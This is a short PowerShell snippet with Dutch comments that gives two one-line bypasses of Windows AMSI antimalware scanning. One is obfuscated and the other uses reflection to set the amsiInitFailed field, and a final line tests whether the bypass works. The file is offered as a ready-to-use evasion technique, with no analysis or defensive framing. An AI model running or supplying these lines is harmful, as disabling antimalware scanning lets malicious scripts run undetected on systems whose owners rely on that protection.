# AMSI Bypass - ScanInterface patch (one-liner)
# Zet AmsiScanBuffer scaninterface flag op true (bypass)
([ref].assembly.gettypes()|?{$_.name-match'siu'}).declaredfields[2].setvalue(0,$true)
# Alternatief (minder geobfusceerd):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Test of bypass werkt:
'AmsiUtils'
